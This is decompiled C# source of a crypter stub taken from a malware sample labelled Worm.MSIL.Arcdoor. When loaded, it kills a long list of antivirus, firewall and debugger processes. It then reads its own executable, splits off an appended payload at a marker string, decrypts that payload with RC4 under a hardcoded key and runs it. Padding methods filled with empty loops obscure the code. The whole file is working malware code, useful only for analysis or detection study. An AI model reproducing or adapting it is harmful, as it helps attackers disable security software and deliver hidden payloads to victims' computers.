// Decompiled with JetBrains decompiler
// Type: dgfgfgfgf.Form1
// Assembly: stub, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2E414A05-CE28-4E8F-95E5-98911B988813
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.jr-e6f97d993f447a335999cf5248f160555bfaacc39197d82d0f5c11d1f84426e9.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace dgfgfgfgf
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    private string ilikepie;
    private const string filesplit = "@Toxicisthebest@";

    [DebuggerNonUserCode]
    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(284, 264);
      this.Name = nameof (Form1);
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    public void sgasag_Fc16u()
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num1 = 7607236;
      while (num1 <= 81449)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++num1; }
      }
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num2 = 7988844;
      while (num2 <= 2844803)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++num2; }
      }
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num3 = 8348172;
      while (num3 <= 226292)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++num3; }
      }
    }

    public void sgasag_EdkPB2hLTf1K()
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void sgasag_Nj3505fAyli63AzZ()
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      while (true)
        ;
    }

    public void sgasag_JCVghB()
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num1 = 5476685;
      do
      {
        checked { ++num1; }
      }
      while (num1 <= 9229546);
      int num2 = 6808194;
      do
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++num2; }
      }
      while (num2 <= 8866001);
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void sgasag_Z5AE7x3mfB4dr7jC()
    {
      int num1 = 5330223;
      do
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++num1; }
      }
      while (num1 <= 5610093);
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num2 = 776847;
      do
      {
        checked { ++num2; }
      }
      while (num2 <= 4327595);
      while (true)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public void sgasag_Wk09v79z3mhkEQ()
    {
      int num1 = 7029701;
      while (num1 <= 4048646)
        checked { ++num1; }
      int num2 = 759979;
      do
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++num2; }
      }
      while (num2 <= 2456788);
    }

    public void sgasag_MQ3E2ld123E()
    {
      if (9940994 <= 2050472)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        while (true)
        {
          try
          {
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      else
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        while (true)
          ;
      }
    }

    public void sgasag_WTz77h4G5PL2()
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      while (true)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public void sgasag_S6CJH3y727()
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      int num = 5319897;
      do
      {
        checked { ++num; }
      }
      while (num <= 6150716);
    }

    public void sgasag_Kxt7r()
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      while (true)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public void boobies()
    {
      string str1;
      string str2 = "Wåñt3Ð" + str1 + "güid" + str1 + "untainted1337";
      string str3;
      this.ilikepie = this.WaNtINAtE(this.WaNtINAtE(str1 + str2 + str3));
    }

    public int RandomNumber(int min, int max) => new Random().Next(min, max);

    public string GetRandom()
    {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.Append(this.RandomString(4, true));
      stringBuilder.Append(this.RandomNumber(1000, 9999));
      stringBuilder.Append(this.RandomString(2, false));
      return stringBuilder.ToString();
    }

    public string RandomString(int size, bool lowerCase)
    {
      StringBuilder stringBuilder = new StringBuilder();
      Random random = new Random();
      int num1 = checked (size - 1);
      int num2 = 0;
      while (num2 <= num1)
      {
        char ch = Convert.ToChar(Convert.ToInt32(26.0 * random.NextDouble() + 65.0));
        stringBuilder.Append(ch);
        checked { ++num2; }
      }
      return lowerCase ? stringBuilder.ToString().ToLower() : stringBuilder.ToString();
    }

    public string WaNtINAtE(string strToHash)
    {
      byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(strToHash));
      string str = "";
      byte[] numArray = hash;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        str += num.ToString("x2");
        checked { ++index; }
      }
      return str;
    }

    private void CheckIfPieTastesGood()
    {
      WebBrowser webBrowser = new WebBrowser();
      if (Module1.GetPage("http://yoursite.com/secure_guid.php?guid=" + this.ilikepie).ToString().Equals("yes"))
        return;
      webBrowser.Navigate("http://");
      int num = (int) Interaction.MsgBox((object) "Please activate your guid first!", MsgBoxStyle.Critical, (object) "Error!");
      ProjectData.EndApp();
    }

    public object kav()
    {
      Process[] processes = Process.GetProcesses();
      int num = checked (processes.Length - 1);
      int index = 0;
      while (index <= num)
      {
        string Left = Strings.LCase(processes[index].ProcessName);
        if (Operators.CompareString(Left, "keyscrambler", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "wireshark", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "anubis", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "mbam", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "avp", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "ollydbg", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "outpost", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "npfmsg", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "bdagent", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "egui", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "zlclient", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "navapsvc", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "avkwctl", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "fsav32", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "mcshield", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "ntrtscan", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "avguard", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "ashServ", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "AVENGINE", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "avgemc", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "tmntsrv", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "gcasServ", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "SpybotSD", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "Ad-Aware", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "sunasServ", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "spysweeper", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "PPActiveDetection", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "msscli", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "Tmas", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "swdoctor", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "spycatcher", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "nisum", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "MpfService", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "blackd", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "fsdfwd", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "smc", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "zlclient", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "persfw", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "efpeadm", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "fsguiexe", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "kpf4gui", false) == 0)
          processes[index].Kill();
        else if (Operators.CompareString(Left, "pccpfw", false) == 0)
          processes[index].Kill();
        checked { ++index; }
      }
      object obj;
      return obj;
    }

    public static string rc4(string message, string password)
    {
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
      int length = password.Length;
      int location1 = 0;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = password.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = Strings.Asc(String);
        numArray1[location1] = location1;
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      int index3 = 0;
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        index3 = checked (index3 + numArray1[location2] + numArray2[location2]) % 256;
        int num = numArray1[location2];
        numArray1[location2] = numArray1[index3];
        numArray1[index3] = num;
        Math.Max(Interlocked.Increment(ref location2), checked (location2 - 1));
      }
      location1 = 1;
      while (location1 <= message.Length)
      {
        index1 = checked (index1 + 1) % 256;
        index2 = checked (index2 + numArray1[index1]) % 256;
        int num1 = numArray1[index1];
        numArray1[index1] = numArray1[index2];
        numArray1[index2] = num1;
        int num2 = numArray1[checked (numArray1[index1] + numArray1[index2]) % 256];
        int CharCode = Strings.Asc(message.Substring(checked (location1 - 1), 1).ToCharArray()[0]) ^ num2;
        stringBuilder.Append(Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location1), checked (location1 - 1));
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }

    public static byte[] StrToByteArray(string str) => new ASCIIEncoding().GetBytes(str);

    public byte[] ToByte(string s) => Encoding.ASCII.GetBytes(s);

    private void Form1_Load(object sender, EventArgs e)
    {
label_0:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        this.kav();
label_1:
        ProjectData.ClearProjectError();
        num1 = -2;
label_2:
        num3 = 3;
        string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
label_3:
        num3 = 4;
        FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
label_4:
        num3 = 5;
        string Expression = Strings.Space(checked ((int) FileSystem.LOF(1)));
label_5:
        num3 = 6;
        FileSystem.FileGet(1, ref Expression);
label_6:
        num3 = 7;
        FileSystem.FileClose(1);
label_7:
        num3 = 8;
        string[] strArray = Strings.Split(Expression, "@Toxicisthebest@");
label_8:
        num3 = 9;
        string s = Form1.rc4(strArray[1], "Toxicisthebest");
label_9:
        num3 = 10;
        byte[] bytes = Encoding.GetEncoding(1252).GetBytes(s);
label_10:
        num3 = 11;
        dd.makeit(bytes, Application.ExecutablePath);
        ProjectData.EndApp();
        goto label_17;
label_12:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_17;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_17:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }
  }
}
